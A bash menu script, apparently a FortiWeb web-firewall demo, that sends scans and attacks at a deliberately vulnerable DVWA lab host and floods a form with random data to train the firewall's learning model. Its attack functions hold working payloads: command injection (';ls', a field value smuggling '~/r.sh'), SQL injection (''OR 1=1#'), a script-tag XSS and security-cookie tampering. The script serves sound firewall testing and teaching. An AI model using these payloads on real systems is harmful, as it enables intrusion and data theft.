# bbuonassera May 4th, 2023
# menu from github.com/barbw1re/bash-menu
#!/bin/bash

###############################################
## Ensure we are running under bash
###############################################
if [ "$BASH_SOURCE" = "" ]; then
    /bin/bash "$0"
    exit 0
fi


###############################################
# Load bash-menu script
#
# NOTE: Ensure this is done before using
#       or overriding menu functions/variables.
###############################################
. "bash-menu.sh"


###############################################
## Debug option disabled by default
###############################################
  DEBUG="disable"


###############################################
## Check Options and Help menu
###############################################
if [ $# -gt 0 ]; then
   case $1 in
  --debug) DEBUG="enable";;
  --help) echo ""; echo "Usage: ${0} [options...]"; echo ""
     echo "Options:"
     echo "  --debug    Turn on debug to show requests"
     echo "  --help     Show program usage"
     echo "";exit;;
  *) echo ""; echo "Usage: ${0} [options...]"
     echo "Options:"
     echo "  --debug    Turn on debug to show requests"; echo ""
     echo "  --help     Show programm usage"
     echo "";exit;;
esac
   echo "??"
fi


###############################################
## Machine Learning Scripts
###############################################
initAll() {
  COUNTER=0
  COUNT=0
  RANGE=255
  I=1
  SP=" / - \ |"
  ILLEGALCHARS="[._?&'\" \[]"
  FIRSTNAME="firstname"
  LASTNAME="lastname"
  ADDRESS="address"
  CITY="city"
  STATE="state"
  POSTAL="postal"
  POSTALNUMERIC_LENGTH=4
  POSTALALPHA_LENGTH=2
  COUNTRY="country"
  EMAIL="email"
  FORMID="form_id"
  SUBMIT="submit"
  CONTENTTYPE="application/x-www-form-urlencoded"
  URL="http://dvwa.corp.fabriclab.ca/fwb/index.html"
  USERAGENT="ML-Request-generator"
  REQUESTTIMEOUT=3
}

firerequest-learn() {
   COUNTER=0
   until [ $COUNTER -eq $COUNT ]
   do
     FIRSTNAME_LENGTH=`shuf -i 4-12 -n 1`
     FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z0-9@' | fold -w $FIRSTNAME_LENGTH | head -n 1)
     LASTNAME_LENGTH=`shuf -i 6-25 -n 1`
     LASTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z0-9-' | fold -w $LASTNAME_LENGTH | head -n 1)
     ADDRESS_LENGTH=`shuf -i 8-22 -n 1`
     ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $ADDRESS_LENGTH | head -n 1)
     ADDRESSNUMBER_LENGTH=`shuf -i 1-5 -n 1`
     ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $ADDRESSNUMBER_LENGTH | head -n 1)
     CITY_LENGTH=`shuf -i 8-30 -n 1`
     CITYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z0-9-' | fold -w $CITY_LENGTH | head -n 1)
     STATE_LENGTH=`shuf -i 6-14 -n 1`
     STATEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $STATE_LENGTH | head -n 1)
     POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $POSTALNUMERIC_LENGTH | head -n 1)
     POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $POSTALALPHA_LENGTH | head -n 1)
     POSTALVALUE=$POSTALNUMERIC$POSTALALPHA
     COUNTRY_LENGTH=`shuf -i 8-18 -n 1`
     COUNTRYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $COUNTRY_LENGTH | head -n 1)
     FORMID_LENGTH=5
     FORMIDVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $FORMID_LENGTH | head -n 1)
     SUBMITVALUE="Submit"
     POSTDATA="$FIRSTNAME=$FIRSTNAMEVALUE&$LASTNAME=$LASTNAMEVALUE&$ADDRESS=$ADDRESSVALUE%20$ADDRESSNUMBERVALUE&$CITY=$CITYVALUE&$STATE=$STATEVALUE&$POSTAL=$POSTALVALUE&$COUNTRY=$COUNTRYVALUE&$FORMID=$FORMIDVALUE&$SUBMIT=$SUBMITVALUE"
     webrequest
     sleep 0.01
     let "COUNTER += 1"  # Increment count.
     printprogress $COUNTER
   done
}

firerequest-relearn() {
   COUNTER=0
   until [ $COUNTER -eq $COUNT ]
   do
     FIRSTNAME_LENGTH=`shuf -i 9-22 -n 1`
     FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $FIRSTNAME_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     LASTNAME_LENGTH=`shuf -i 12-35 -n 1`
     LASTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $LASTNAME_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     ADDRESS_LENGTH=`shuf -i 3-32 -n 1`
     ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $ADDRESS_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     ADDRESSNUMBER_LENGTH=`shuf -i 4-9 -n 1`
     ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $ADDRESSNUMBER_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     CITY_LENGTH=`shuf -i 8-30 -n 1`
     CITYVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $CITY_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     STATE_LENGTH=`shuf -i 9-24 -n 1`
     STATEVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $STATE_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $POSTALNUMERIC_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $POSTALALPHA_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     POSTALVALUE=$POSTALNUMERIC$POSTALALPHA
     COUNTRY_LENGTH=`shuf -i 12-38 -n 1`
     COUNTRYVALUE=$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $COUNTRY_LENGTH | head -n 1| sed "s/${ILLEGALCHARS}//g")
     FORMID_LENGTH=15
     FORMIDVALUE=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $FORMID_LENGTH | head -n 1)
     SUBMITVALUE="Submit"
     POSTDATA="$FIRSTNAME=$FIRSTNAMEVALUE&$LASTNAME=$LASTNAMEVALUE&$ADDRESS=$ADDRESSVALUE%20$ADDRESSNUMBERVALUE&$CITY=$CITYVALUE&$STATE=$STATEVALUE&$POSTAL=$POSTALVALUE&$COUNTRY=$COUNTRYVALUE&$FORMID=$FORMIDVALUE&$SUBMIT=$SUBMITVALUE"
     webrequest
     sleep 0.01
     let "COUNTER += 1"  # Increment count.
     printprogress $COUNTER
   done
}

firerequest-XSS() {
   COUNTER=0
   until [ $COUNTER -eq $COUNT ]
   do
     FIRSTNAME_LENGTH=`shuf -i 4-12 -n 1`
     FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $FIRSTNAME_LENGTH | head -n 1)
     LASTNAMEVALUE='<script>alert("XSS-hack-attempt")</script>'
     ADDRESS_LENGTH=`shuf -i 8-22 -n 1`
     ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $ADDRESS_LENGTH | head -n 1)
     ADDRESSNUMBER_LENGTH=`shuf -i 1-5 -n 1`
     ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $ADDRESSNUMBER_LENGTH | head -n 1)
     CITY_LENGTH=`shuf -i 8-30 -n 1`
     CITYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $CITY_LENGTH | head -n 1)
     STATE_LENGTH=`shuf -i 6-14 -n 1`
     STATEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $STATE_LENGTH | head -n 1)
     POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $POSTALNUMERIC_LENGTH | head -n 1)
     POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $POSTALALPHA_LENGTH | head -n 1)
     POSTALVALUE=$POSTALNUMERIC$POSTALALPHA
     COUNTRY_LENGTH=`shuf -i 8-18 -n 1`
     COUNTRYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $COUNTRY_LENGTH | head -n 1)
     FORMID_LENGTH=5
     FORMIDVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $FORMID_LENGTH | head -n 1)
     SUBMITVALUE="Submit"
     POSTDATA="$FIRSTNAME=$FIRSTNAMEVALUE&$LASTNAME=$LASTNAMEVALUE&$ADDRESS=$ADDRESSVALUE%20$ADDRESSNUMBERVALUE&$CITY=$CITYVALUE&$STATE=$STATEVALUE&$POSTAL=$POSTALVALUE&$COUNTRY=$COUNTRYVALUE&$FORMID=$FORMIDVALUE&$SUBMIT=$SUBMITVALUE"
     webrequest
     sleep 0.01
     let "COUNTER += 1"  # Increment count.
     printprogress $COUNTER
   done
}

firerequest-ExploitZeroDayCMDi() {
   COUNTER=0
   until [ $COUNTER -eq $COUNT ]
   do
     FIRSTNAME_LENGTH=`shuf -i 4-12 -n 1`
     FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $FIRSTNAME_LENGTH | head -n 1)
     LASTNAMEVALUE='C;~/r.sh-%20c;~/r.sh'
     ADDRESS_LENGTH=`shuf -i 8-22 -n 1`
     ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $ADDRESS_LENGTH | head -n 1)
     ADDRESSNUMBER_LENGTH=`shuf -i 1-5 -n 1`
     ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $ADDRESSNUMBER_LENGTH | head -n 1)
     CITY_LENGTH=`shuf -i 8-30 -n 1`
     CITYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $CITY_LENGTH | head -n 1)
     STATE_LENGTH=`shuf -i 6-14 -n 1`
     STATEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $STATE_LENGTH | head -n 1)
     POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $POSTALNUMERIC_LENGTH | head -n 1)
     POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $POSTALALPHA_LENGTH | head -n 1)
     POSTALVALUE=$POSTALNUMERIC$POSTALALPHA
     COUNTRY_LENGTH=`shuf -i 8-18 -n 1`
     COUNTRYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $COUNTRY_LENGTH | head -n 1)
     FORMID_LENGTH=5
     FORMIDVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $FORMID_LENGTH | head -n 1)
     SUBMITVALUE="Submit"
     POSTDATA="$FIRSTNAME=$FIRSTNAMEVALUE&$LASTNAME=$LASTNAMEVALUE&$ADDRESS=$ADDRESSVALUE%20$ADDRESSNUMBERVALUE&$CITY=$CITYVALUE&$STATE=$STATEVALUE&$POSTAL=$POSTALVALUE&$COUNTRY=$COUNTRYVALUE&$FORMID=$FORMIDVALUE&$SUBMIT=$SUBMITVALUE"
     webrequest
     sleep 0.01
     let "COUNTER += 1"  # Increment count.
     printprogress $COUNTER
   done
}

firerequest-ExploitZeroDaySQLi() {
    COUNTER=0
    until [ $COUNTER -eq $COUNT ]
    do
     FIRSTNAME_LENGTH=`shuf -i 4-12 -n 1`
     FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $FIRSTNAME_LENGTH | head -n 1)
     LASTNAME_LENGTH=`shuf -i 6-25 -n 1`
     LASTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $LASTNAME_LENGTH | head -n 1)
     ADDRESS_LENGTH=`shuf -i 8-22 -n 1`
     ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $ADDRESS_LENGTH | head -n 1)
     ADDRESSNUMBER_LENGTH=`shuf -i 1-5 -n 1`
     ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $ADDRESSNUMBER_LENGTH | head -n 1)
     CITYVALUE="A%20'DIV'%20B%20-%20A%20'DIV%20B"
     STATE_LENGTH=`shuf -i 6-14 -n 1`
     STATEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $STATE_LENGTH | head -n 1)
     POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $POSTALNUMERIC_LENGTH | head -n 1)
     POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $POSTALALPHA_LENGTH | head -n 1)
     POSTALVALUE=$POSTALNUMERIC$POSTALALPHA
     COUNTRY_LENGTH=`shuf -i 8-18 -n 1`
     COUNTRYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $COUNTRY_LENGTH | head -n 1)
     FORMID_LENGTH=5
     FORMIDVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $FORMID_LENGTH | head -n 1)
     SUBMITVALUE="Submit"
     POSTDATA="$FIRSTNAME=$FIRSTNAMEVALUE&$LASTNAME=$LASTNAMEVALUE&$ADDRESS=$ADDRESSVALUE%20$ADDRESSNUMBERVALUE&$CITY=$CITYVALUE&$STATE=$STATEVALUE&$POSTAL=$POSTALVALUE&$COUNTRY=$COUNTRYVALUE&$FORMID=$FORMIDVALUE&$SUBMIT=$SUBMITVALUE"
     webrequest
     sleep 0.01
     let "COUNTER += 1"  # Increment count.
     printprogress $COUNTER
   done
}

firerequest-ExploitSQLi() {
    COUNTER=0
    until [ $COUNTER -eq $COUNT ]
    do
     FIRSTNAME_LENGTH=`shuf -i 4-12 -n 1`
     FIRSTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $FIRSTNAME_LENGTH | head -n 1)
     LASTNAME_LENGTH=`shuf -i 6-25 -n 1`
     LASTNAMEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $LASTNAME_LENGTH | head -n 1)
     ADDRESS_LENGTH=`shuf -i 8-22 -n 1`
     ADDRESSVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $ADDRESS_LENGTH | head -n 1)
     ADDRESSNUMBER_LENGTH=`shuf -i 1-5 -n 1`
     ADDRESSNUMBERVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $ADDRESSNUMBER_LENGTH | head -n 1)
     CITYVALUE="'OR 1=1#"
     STATE_LENGTH=`shuf -i 6-14 -n 1`
     STATEVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $STATE_LENGTH | head -n 1)
     POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $POSTALNUMERIC_LENGTH | head -n 1)
     POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $POSTALALPHA_LENGTH | head -n 1)
     POSTALVALUE=$POSTALNUMERIC$POSTALALPHA
     COUNTRY_LENGTH=`shuf -i 8-18 -n 1`
     COUNTRYVALUE=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $COUNTRY_LENGTH | head -n 1)
     FORMID_LENGTH=5
     FORMIDVALUE=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $FORMID_LENGTH | head -n 1)
     SUBMITVALUE="Submit"
     POSTDATA="$FIRSTNAME=$FIRSTNAMEVALUE&$LASTNAME=$LASTNAMEVALUE&$ADDRESS=$ADDRESSVALUE%20$ADDRESSNUMBERVALUE&$CITY=$CITYVALUE&$STATE=$STATEVALUE&$POSTAL=$POSTALVALUE&$COUNTRY=$COUNTRYVALUE&$FORMID=$FORMIDVALUE&$SUBMIT=$SUBMITVALUE"
     webrequest
     sleep 0.01
     let "COUNTER += 1"  # Increment count.
     printprogress $COUNTER
   done
}

printprogress() {
  [[ $1 = *5 ]] && printf "\b${SP:I++%${#SP}:1}"
  [[ $1 = *00 ]] && echo -n "$1 "
}

webrequest() {
  [ ${DEBUG} == "enable" ] && echo "URL:"${URL} "POSTDATA":${POSTDATA}
  curl -A ${USERAGENT} -m ${REQUESTTIMEOUT} -g --retry 3 --retry-delay 1 -s -o /dev/null -X ${METHOD} -H "Content-Type: ${CONTENTTYPE}" "${URL}" -d "$POSTDATA" &
}

############################################################################
## Colors
############################################################################
BOLD='\033[1m'
RESTORE='\033[0m'
RED='\033[00;31m'
GREEN='\033[00;32m'
YELLOW='\033[00;33m'
BLUE='\033[00;34m'
PURPLE='\033[00;35m'
CYAN='\033[00;36m'
LIGHTGRAY='\033[00;37m'


############################################################################
## Menu Actions
##
## They should return 1 to indicate that the menu
## should continue, or return 0 to signify the menu
## should exit.
############################################################################

############################################################################
## Scan & Standard Attacks
############################################################################

Vulnerability_Scanner() {
    echo ""
    rm -Rf /var/www/html/report/report
    skipfish -u -k 0:0:30 -o /var/www/html/report/report http://dvwa.corp.fabriclab.ca
    #rm -Rf ~/report
    #skipfish -u -k 0:0:30 -o ~/report http://dvwa.corp.fabriclab.ca
    echo -e "${RED}Scan Report available at https://flbr1kali01.fortiweb.fabriclab.ca${RESTORE}"
    echo ""
    echo -n "Check the Attack Logs. Press enter to continue... "
    read response
    return 1
}

Exploit_CMDi_Attack() {
    echo -e "\nCommand Injection Attack\n"
    echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/login.php${RESTORE} username=${BLUE}pablo${RESTORE} password=${BLUE}letmein${RESTORE}\n"
    curl 'https://dvwa.corp.fabriclab.ca/login.php' \
        -H 'authority: dvwa.corp.fabriclab.ca' \
        -H 'cache-control: max-age=0' \
        -H 'content-type: application/x-www-form-urlencoded' \
        -H 'origin: https://dvwa.corp.fabriclab.ca' \
        -H 'referer: https://dvwa.corp.fabriclab.ca/' \
        -H 'user-agent: FortiWeb Demo Script' \
        --insecure \
        --data-raw 'username=pablo&password=letmein&Login=Login' \
        -c cookie.txt

    echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/vulnerabilities/exec/${RESTORE} submit=${RED}\";ls\"\n"
    curl 'https://dvwa.corp.fabriclab.ca/vulnerabilities/exec/' \
        -H 'authority: dvwa.corp.fabriclab.ca' \
        -H 'cache-control: max-age=0' \
        -H 'content-type: application/x-www-form-urlencoded' \
        -H 'origin: https://dvwa.corp.fabriclab.ca' \
        -H 'referer: https://dvwa.corp.fabriclab.ca/index.php' \
        -H 'user-agent: FortiWeb Demo Script' \
        --insecure \
        --data-raw 'ip=;ls&Submit=Submit' \
        -b cookie.txt

    echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

Exploit_SQLi_Attack() {
    echo -e "\nSQL Injection Attack\n"
    echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/login.php${RESTORE} username=${BLUE}gordonb${RESTORE} password=${BLUE}abc123${RESTORE}\n"
    curl 'https://dvwa.corp.fabriclab.ca/login.php' \
        -H 'authority: dvwa.corp.fabriclab.ca' \
        -H 'cache-control: max-age=0' \
        -H 'content-type: application/x-www-form-urlencoded' \
        -H 'origin: https://dvwa.corp.fabriclab.ca' \
        -H 'referer: https://dvwa.corp.fabriclab.ca/' \
        -H 'user-agent: FortiWeb Demo Script' \
        --insecure \
        --data-raw 'username=gordonb&password=abc123&Login=Login' \
        -c cookie.txt

    echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/vulnerabilities/sqli/${RESTORE} id=${RED}\"'OR 1=1#\"\n"
    curl 'https://dvwa.corp.fabriclab.ca/vulnerabilities/sqli/?id=%27OR+1%3D1%23&Submit=Submit' \
        -H 'authority: dvwa.corp.fabriclab.ca' \
        -H 'cache-control: max-age=0' \
        -H 'content-type: application/x-www-form-urlencoded' \
        -H 'origin: https://dvwa.corp.fabriclab.ca' \
        -H 'referer: https://dvwa.corp.fabriclab.ca/index.php' \
        -H 'user-agent: FortiWeb Demo Script' \
        --insecure \
        -b cookie.txt

    echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

Cookie_Security() {
    echo -e "\nCookie Security\n"
    echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/login.php${RESTORE} username=${BLUE}smithy${RESTORE} password=${BLUE}password${RESTORE}\n"
    curl 'https://dvwa.corp.fabriclab.ca/login.php' \
        -H 'authority: dvwa.corp.fabriclab.ca' \
        -H 'cache-control: max-age=0' \
        -H 'content-type: application/x-www-form-urlencoded' \
        -H 'origin: https://dvwa.corp.fabriclab.ca' \
        -H 'referer: https://dvwa.corp.fabriclab.ca/' \
        -H 'user-agent: FortiWeb Demo Script' \
        --insecure \
        --data-raw 'username=smithy&password=password&Login=Login' \
        -c cookie.txt

    echo -e "We have 3 cookies. Security Cookie = ${RED}low${RESTORE}.\n"
    grep HttpOnly_dvwa.corp.fabriclab.ca cookie.txt
    echo -e "\nLet's change the value to ${RED}medium${RESTORE}. Press enter to continue... "
    read response
    sed -i 's/low/medium/' cookie.txt
    grep HttpOnly_dvwa.corp.fabriclab.ca cookie.txt
    echo -e "\nNow that we've changed the security level, let's connect again to the server. Press enter to continue... "
    read response

    echo -e "Connecting to ${BLUE}https://dvwa.corp.fabriclab.ca/security.php\n${RED}"
    curl 'https://dvwa.corp.fabriclab.ca/security.php' \
        -H 'authority: dvwa.corp.fabriclab.ca' \
        -H 'cache-control: max-age=0' \
        -H 'content-type: application/x-www-form-urlencoded' \
        -H 'origin: https://dvwa.corp.fabriclab.ca' \
        -H 'referer: https://dvwa.corp.fabriclab.ca/index.php' \
        -H 'user-agent: FortiWeb Demo Script' \
        --insecure \
        -b cookie.txt

    echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

Web_Crawler() {
    echo "Web Crawler Started"
    httrack dvwa.corp.fabriclab.ca -O ./dvwa --testlinks -%v -F "wotbox"
    echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

Brute_Force_Attack() {
    echo -e "\nBrute Force Attack"
    echo "The CSE need to build the script here ;-)"
    echo -en "\n\n${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response

    return 1
}

############################################################################
## Machine Learning Actions
############################################################################
ML_Learn_Parameters() {
    COUNT=3000
    METHOD="POST"
    echo -e "\nSending 3000 requests - Learn\n"
    echo -en "${GREEN}Requests : "
    firerequest-learn
    echo -en "\n\n${YELLOW}Check Machine Learning Status${RESTORE}. Press enter to continue... "
    read response
    return 1
}

ML_Relearn_Parameters() {
    COUNT=3000
    METHOD="POST"
    echo -e "\nSending 3000 requests - Relearn\n"
    echo -en "${GREEN}Requests : "
    firerequest-relearn
    echo -en "\n\n${YELLOW}Check Machine Learning Status${RESTORE}. Press enter to continue... "
    read response
    return 1
}

ML_Exploit_XSS() {
    COUNT=1
    METHOD="POST"
    echo -e "\nSending Cross-Site Scripting\n"
    firerequest-XSS
    echo -en "${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

ML_Exploit_SQLi() {
    COUNT=1
    METHOD="POST"
    echo -e "\nSending SQL Injection\n"
    firerequest-ExploitSQLi
    echo -en "${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

ML_Exploit_ZeroDay_CMDi() {
    COUNT=1
    METHOD="POST"
    echo -e "\nSending Zero Day Command Injection\n"
    firerequest-ExploitZeroDayCMDi
    echo -en "${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

ML_Exploit_ZeroDay_SQLi() {
    COUNT=1
    METHOD="POST"
    echo -e "\nSending Zero Day SQL Injection\n"
    firerequest-ExploitZeroDaySQLi
    echo -en "${YELLOW}Check the Attack Logs${RESTORE}. Press enter to continue... "
    read response
    return 1
}

ML_Custom_Request() {
    COUNTER=0    
    echo ""
    read -p $'Amount of requests (\e[0;35m1\e[m): ' COUNT
    read -p $'URL (\e[0;35mhttp://fwb.corp.fabriclab.ca/fwb/index.html\e[m): ' URL
    read -p $'Method (GET, \e[0;35mPOST\e[m, PUT, DELETE, OPTIONS, HEAD): ' METHODIN
    read -p $'Parameter name (\e[0;35mfirstname\e[m, lastname, address, city, state, postal, country): ' PARAMETER
    read -p $'Data type (date-short, date-long, postal, email, phone, \e[0;35mrandom\e[m, number-small, number-big): ' PARAMETERTYPE

    [ -z $URL ] && URL="http://fwb.corp.fabriclab.ca/fwb/index.html"
    [ -z $COUNT ] && COUNT=1
    [ -z $METHODIN ] && METHODIN="POST"
    [ -z $PARAMETER ] && PARAMETER="firstname"
    [ -z $PARAMETERTYPE ] && PARAMETERTYPE="random"
    
    METHOD=`echo $METHODIN | tr [:lower:] [:upper:]`

    if [ -z $COUNT ] || [ -z $URL ] || [ -z $METHODIN ] || [ -z PARAMETER ] || [ -z $PARAMETERTYPE ]
    then
        echo -en "${RED}ERROR: Empty input detected.\n${RESTORE}Press enter to continue ... "
        read response
        return 1
    elif [ $METHOD != "GET" ] && [ $METHOD != "POST" ] && [ $METHOD != "PUT" ] && [ $METHOD != "DELETE" ] && [ $METHOD != "OPTIONS" ] && [ $METHOD != "HEAD" ]
    then
        echo -en "${RED}ERROR: Invalid method given.\n${RESTORE}Press enter to continue ... "
        read response
        return 1
    elif [[ $URL != *http* ]]
    then
        echo -en "${RED}ERROR: Invalid URL given. Use http://<fqdn>/<path>/<object>.\n${RESTORE}Press enter to continue ... "
        read response
        return 1
    fi
    
    echo -e "${GREEN}Sending ${COUNT} custom request(s)"
    if [ $COUNT -gt 99 ]
    then
        echo -n "Requests : "
    fi

    
    until [ $COUNTER -eq $COUNT ]
    do
        if [ $PARAMETERTYPE = "date-short" ]
        then
        temp=$(echo "$RANDOM * $RANDOM * $RANDOM / 1000" | bc -l)
        PARAMETERVALUE=$(date -d @$temp +%d" "%m" "%Y" "%H":"%M":"%S)
        elif [ $PARAMETERTYPE = "date-long" ]
        then
        temp=$(echo "$RANDOM * $RANDOM * $RANDOM / 1000" | bc -l)
        PARAMETERVALUE=$(date -d @$temp)
        elif [ $PARAMETERTYPE = "postal" ]
        then
        POSTALNUMERIC_LENGTH=4
        POSTALALPHA_LENGTH=2
        POSTALNUMERIC=$(head -c400 < /dev/urandom | tr -dc '0-9' | fold -w $POSTALNUMERIC_LENGTH | head -n 1)
        POSTALALPHA=$(head -c400 < /dev/urandom | tr -dc 'A-Z' | fold -w $POSTALALPHA_LENGTH | head -n 1)
        PARAMETERVALUE=$POSTALNUMERIC$POSTALALPHA
        elif [ $PARAMETERTYPE = "email" ]
        then
        EMAILNAME_LENGTH=`shuf -i 4-15 -n 1`
        EMAILDOMAIN_LENGTH=`shuf -i 5-20 -n 1`
        EMAILEXT_LENGTH=`shuf -i 3-4 -n 1`
        USER_NAME=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $EMAILNAME_LENGTH | head -n 1)
        DOMAIN_NAME=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $EMAILDOMAIN_LENGTH | head -n 1)
        DOMAIN_EXT=$(head -c400 < /dev/urandom | tr -dc 'a-zA-Z' | fold -w $EMAILEXT_LENGTH | head -n 1)
        PARAMETERVALUE=$USER_NAME@$DOMAIN_NAME.$DOMAIN_EXT
        elif [ $PARAMETERTYPE = "phone" ]
        then
        COUNTRYCODE=`shuf -i 1-99 -n 1`
        AREAPHONE=`shuf -i 100000000-999999999 -n 1`
        PARAMETERVALUE="%2B$COUNTRYCODE-$AREAPHONE"
        elif [ $PARAMETERTYPE = "random" ]
        then
        RANDOM_LENGTH=15
        PARAMETERVALUE="$(head -c400 < /dev/urandom | tr -dc [:print:] | fold -w $RANDOM_LENGTH | head -n 1| sed s/[\?\&]//g)"
        elif [ $PARAMETERTYPE = "number-small" ]
        then
        PARAMETERVALUE=`shuf -i 0-100 -n 1`
        elif [ $PARAMETERTYPE = "number-big" ]
        then
        PARAMETERVALUE=`shuf -i 1000-10000000 -n 1`
        else
        echo -en "${RED}ERROR: No valid data type.\n${RESTORE}Press enter to continue ... "
        read response
        return 1
        fi

        [ ${DEBUG} == "enable" ] && echo "Method="${METHOD} "URL="${URL} "Parameter="${PARAMETER} "Value="${PARAMETERVALUE}

        [ $METHOD == GET ]  && ( WEBPARAMETERVALUE=`echo $PARAMETERVALUE | sed s/\ /%20/g` ; curl -A ML-tester -s "$URL?$PARAMETER=$WEBPARAMETERVALUE" -o /dev/null)
        [ $METHOD == POST ]  && curl -A ML-tester -s -X $METHOD $URL -d "$PARAMETER=$PARAMETERVALUE" -o /dev/null
        [ $METHOD == PUT ]  && curl -A ML-tester -s -X $METHOD $URL -d "$PARAMETER=$PARAMETERVALUE" -o /dev/null
        [ $METHOD == DELETE ]  && curl -A ML-tester -s -X $METHOD $URL -d "$PARAMETER=$PARAMETERVALUE" -o /dev/null
        [ $METHOD == OPTIONS ]  && curl -A ML-tester -s -X $METHOD $URL -d "$PARAMETER=$PARAMETERVALUE" -o /dev/null
        [ $METHOD == HEAD ]  && curl -A ML-tester -s -X $METHOD $URL -o /dev/null
        sleep 0.02
        let "COUNTER += 1"  # Increment count.
        printprogress $COUNTER
    done
    
    echo -en "${RESTORE}Press enter to continue ... "
    read response
    return 1
}

############################################################################
## REST API
############################################################################
